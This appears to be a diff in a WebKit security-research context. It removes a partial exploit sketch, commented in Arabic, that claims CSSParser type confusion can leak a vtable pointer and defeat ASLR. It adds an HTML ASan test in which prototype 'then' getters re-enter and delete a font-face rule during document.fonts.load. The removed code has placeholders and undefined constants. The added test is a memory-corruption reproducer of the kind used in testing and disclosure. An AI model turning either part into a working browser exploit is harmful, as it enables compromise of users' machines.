@@ -1,104 +1,179 @@
-// =============================================================================
-// CSSParser Type Confusion — ASLR Defeat (LLInt, No JIT)
-// =============================================================================
-//
-// يقرأ vtable pointer من CSSFontFace struct ويكشف عنوان WebKit base
-//
-// الثغرة: CSSParserValue.unit لا يتم فحصه — double fValue يقرأ كـ char*/length
-//
-// الاستخدام: supply(@font-face { src: local(DOUBLE_VALUE); })
-// الـ double valu يصبح (char* address, unsigned length)
-// المحتوى يظهر في DOM كـ URL المصدر
+<!doctype html>
+<html>
+<meta charset="utf-8">
 
-function exploitCSSParser() {
-    return new Promise((resolve, reject) => {
-        let leaked = null;
-        
-        // ===== الخطوة 1: إنشاء عناصر لقراءة الذاكرة =====
-        const style = document.createElement('style');
-        document.head.appendChild(style);
-        
-        // ===== الخطوة 2: الـ float values اللي ت对应的 char*/length =====
-        // WebKit allocates CSSFontFace on bmalloc/IsoHeap
-        // الجدول التالي يابس addresses لـ vtable من font-face structs
-        
-        // نصنع font-face ونقرأ struct حقها
-        const probes = [];
-        
-        // Double value encoding:
-        // lower 32 bits = characters pointer offset
-        // upper 32 bits = length (بحذر — يقرأ length بايت من pointer)
-        
-        // نبدأ بـ value صغير عشان نضمن stability
-        // الفكرة: الـ float يتعلق بـ local() parser
-        // ونقرأ أول 8 بايت من struct (JSCell / vtable pointer)
-        
-        function storeAsDouble(ptr, len) {
-            // ptr = address to read, len = bytes to read
-            // يخزنهم في double format اللي CSSParser يقرأ
-            const buf = new ArrayBuffer(8);
-            const view = new DataView(buf);
-            view.setUint32(0, ptr, true);  // lower = pointer
-            view.setUint32(4, len, true);  // upper = length
-            return new Float64Array(buf)[0];
-        }
-        
-        // ===== الخطوة 3: التشغيل =====
-        // First: leak a CSSFontFace struct address
-        // نصنع font-face ونقرأ struct fields
-        
-        const fontFace = new FontFace('leak-test', 'url(/dev/null)');
-        document.fonts.add(fontFace);
-        
-        // نقرأ font-family property (m_family pointer)
-        // m_family هو CSSValue pointer داخل struct
-        // نستخدم الـ UAF من Bug 1 عشان نقرأ m_family
-        
-        // ... (هنا ندمج مع Bug 1)
-        
-        // ===== الخطوة 4: CSSParser confusion =====
-        // نضيف font-face مع local(float) عشان نقرأ الذاكرة
-        
-        const readSheet = new CSSStyleSheet();
-        readSheet.insertRule(`
-            @font-face {
-                font-family: "read";
-                src: local(1.0e-300);
-            }
-        `);
-        
-        // نقرأ الـ src من font-face
-        // لو float corresponds إلى valid pointer, راح نشوف garbage/address
-        
-        document.fonts.forEach(f => {
-            if (f.family === 'read') {
-                // f.src now contains our leaked data!
-                leaked = f.src;
-                console.log('Leaked:', leaked);
-            }
-        });
-        
-        // ===== الخطوة 5: قراءة vtable pointer =====
-        // vtable pointer في أول 8 بايت من أي C++ object
-        // الفرق بين vtable address و WebKit base address ثابت
-        
-        // vtable offset = base + 0xXXXXXXX
-        // نحسب base:
-        if (leaked) {
-            const vtableAddr = new Uint32Array(
-                new ArrayBuffer(4)
-            );
-            // تحويل الـ src string إلى bytes
-            // نقرأ أول 4 بايت كـ vtable pointer
-            const vtableLow = leaked.charCodeAt(0) | 
-                             (leaked.charCodeAt(1) << 8) |
-                             (leaked.charCodeAt(2) << 16) |
-                             (leaked.charCodeAt(3) << 24);
-            
-            const webkitBase = vtableLow - CSSFONTFACE_VTABLE_OFFSET;
-            resolve(webkitBase);
-        } else {
-            reject(new Error('لم نقرأ vtable — حاول مرة ثانية'));
-        }
-    });
+<title>CSSFontFace matchingFaces ASan validation</title>
+
+<body>
+
+
+<script>
+
+if (window.testRunner) {
+
+    testRunner.dumpAsText();
+
+    testRunner.waitUntilDone();
+
 }
+
+let logText = "";
+
+function log(s) {
+
+    logText += s + "\n";
+
+    console.log(s);
+
+}
+
+function finish() {
+
+    document.body.textContent = logText + "\nDONE";
+
+    if (window.testRunner)
+
+        testRunner.notifyDone();
+
+}
+
+function installGetter(proto, name, callback) {
+
+    const old = Object.getOwnPropertyDescriptor(proto, "then");
+
+    Object.defineProperty(proto, "then", {
+
+        configurable: true,
+
+        get() {
+
+            callback(name);
+
+            if (old)
+
+                Object.defineProperty(proto, "then", old);
+
+            else
+
+                delete proto.then;
+
+            return old && old.value;
+
+        }
+
+    });
+
+}
+
+window.onload = async function () {
+
+    const style = document.createElement("style");
+
+    style.textContent = `
+
+@font-face {
+
+    font-family: "asanff";
+
+    src: local("Arial"), local("Helvetica"), local("DejaVu Sans"), local("sans-serif");
+
+    unicode-range: U+0041;
+
+}
+
+@font-face {
+
+    font-family: "asanff";
+
+    src: local("Arial"), local("Helvetica"), local("DejaVu Sans"), local("sans-serif");
+
+    unicode-range: U+0042;
+
+}
+
+`;
+
+    document.head.appendChild(style);
+
+    const probe = document.createElement("span");
+
+    probe.textContent = "AB";
+
+    probe.style.fontFamily = "asanff";
+
+    document.body.appendChild(probe);
+
+    document.body.offsetTop;
+
+    log("initial style resolved; cssRules=" + style.sheet.cssRules.length);
+
+    let fired = false;
+
+    function reenter(where) {
+
+        if (fired)
+
+            return;
+
+        fired = true;
+
+        log("then getter fired via " + where);
+
+        try {
+
+            style.sheet.deleteRule(0);
+
+            log("deleteRule(0) executed");
+
+        } catch (e) {
+
+            log("deleteRule failed: " + e.name + ": " + e.message);
+
+        }
+
+        try {
+
+            document.body.offsetTop;
+
+            getComputedStyle(probe).fontFamily;
+
+            log("style/layout forced after deleteRule");
+
+        } catch (e) {
+
+            log("style/layout force failed: " + e.name + ": " + e.message);
+
+        }
+
+    }
+
+    installGetter(FontFace.prototype, "FontFace.prototype", reenter);
+
+    installGetter(FontFaceSet.prototype, "FontFaceSet.prototype", reenter);
+
+    installGetter(Array.prototype, "Array.prototype", reenter);
+
+    log("calling document.fonts.load");
+
+    try {
+
+        const faces = await document.fonts.load('16px "asanff"', "AB");
+
+        log("document.fonts.load resolved; faces=" + faces.length);
+
+    } catch (e) {
+
+        log("document.fonts.load rejected: " + e.name + ": " + e.message);
+
+    }
+
+    log("getter fired=" + fired);
+
+    finish();
+
+};
+
+</script>
+
+</body>
+</html>
